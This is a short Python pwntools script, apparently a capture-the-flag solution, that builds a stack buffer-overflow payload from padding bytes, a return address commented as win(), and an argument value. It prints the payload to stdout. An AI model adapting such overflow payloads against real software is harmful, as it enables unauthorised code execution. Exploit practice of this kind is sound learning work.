from pwn import *
import sys
chain = b''
chain += pack(0x41414141, endianness='little')		# 'AAAAAAAAAAAAAAAAA'
chain += pack(0x41414141, endianness='little')
chain += pack(0x41414141, endianness='little')
chain += pack(0x41414141, endianness='little')
chain += pack(0x41, word_size="all", endianness='little')
chain += pack(0x80491c6, endianness='little')		# win()
chain += pack(0x7b, word_size="all", endianness='little')
sys.stdout.buffer.write(chain)
